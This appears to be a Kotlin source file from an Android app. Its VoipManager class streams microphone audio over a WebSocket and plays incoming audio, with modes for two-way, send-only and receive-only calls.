package com.systemlinker.features.call

import android.annotation.SuppressLint
import android.content.Context
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioRecord
import android.media.AudioTrack
import android.media.MediaRecorder
import com.systemlinker.base.ErrorLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import java.util.concurrent.TimeUnit

class VoipManager(private val context: Context) : WebSocketListener() {

    private val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
    private var webSocket: WebSocket? = null
    
    private val client = OkHttpClient.Builder()
        .pingInterval(10, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    private val sampleRate = 16000
    private val channelIn = AudioFormat.CHANNEL_IN_MONO
    private val channelOut = AudioFormat.CHANNEL_OUT_MONO
    private val format = AudioFormat.ENCODING_PCM_16BIT

    private var audioRecord: AudioRecord? = null
    private var audioTrack: AudioTrack? = null
    
    private val scope = CoroutineScope(Dispatchers.IO)
    private var micJob: Job? = null

    private var currentMode = "nm"
    private var originalAudioMode = AudioManager.MODE_NORMAL
    private var originalSpeakerState = false

    var isCallActive = false
        private set

    fun startCall(wsUrl: String, mode: String, speakerMode: String) {
        if (isCallActive) return
        isCallActive = true
        currentMode = mode

        originalAudioMode = audioManager.mode
        originalSpeakerState = audioManager.isSpeakerphoneOn

        audioManager.mode = AudioManager.MODE_IN_COMMUNICATION
        audioManager.isSpeakerphoneOn = (speakerMode == "loud")

        val request = Request.Builder().url(wsUrl).build()
        webSocket = client.newWebSocket(request, this)

        if (mode == "nm" || mode == "btc2") startMic()
        if (mode == "nm" || mode == "btcs") startSpeaker()
    }

    fun endCall() {
        if (!isCallActive) return
        isCallActive = false

        micJob?.cancel()
        
        try { audioRecord?.stop(); audioRecord?.release() } catch (e: Exception) {}
        try { audioTrack?.stop(); audioTrack?.release() } catch (e: Exception) {}
        
        audioRecord = null
        audioTrack = null
        
        webSocket?.close(1000, "Call Ended")
        webSocket = null

        audioManager.mode = originalAudioMode
        audioManager.isSpeakerphoneOn = originalSpeakerState
    }

    @SuppressLint("MissingPermission")
    private fun startMic() {
        val minBufSize = AudioRecord.getMinBufferSize(sampleRate, channelIn, format)
        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION, 
            sampleRate, channelIn, format, minBufSize
        )
        
        audioRecord?.startRecording()
        
        micJob = scope.launch {
            val buffer = ByteArray(minBufSize)
            while (isActive && isCallActive) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0) {
                    val data = ByteArray(read)
                    System.arraycopy(buffer, 0, data, 0, read)
                    webSocket?.send(ByteString.of(*data))
                }
            }
        }
    }

    private fun startSpeaker() {
        val minBufSize = AudioTrack.getMinBufferSize(sampleRate, channelOut, format)
        audioTrack = AudioTrack.Builder()
            .setAudioAttributes(
                AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                    .build()
            )
            .setAudioFormat(
                AudioFormat.Builder()
                    .setSampleRate(sampleRate)
                    .setEncoding(format)
                    .setChannelMask(channelOut)
                    .build()
            )
            .setBufferSizeInBytes(minBufSize)
            .setTransferMode(AudioTrack.MODE_STREAM)
            .build()

        audioTrack?.play()
    }

    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
        if (!isCallActive || (currentMode != "nm" && currentMode != "btcs")) return
        
        val pcmData = bytes.toByteArray()
        if (audioTrack?.playState == AudioTrack.PLAYSTATE_PLAYING) {
            audioTrack?.write(pcmData, 0, pcmData.size)
        }
    }

    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) { endCall() }
    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        ErrorLogger.logError(context, "VoipManager_Failure", t)
        endCall()
    }
}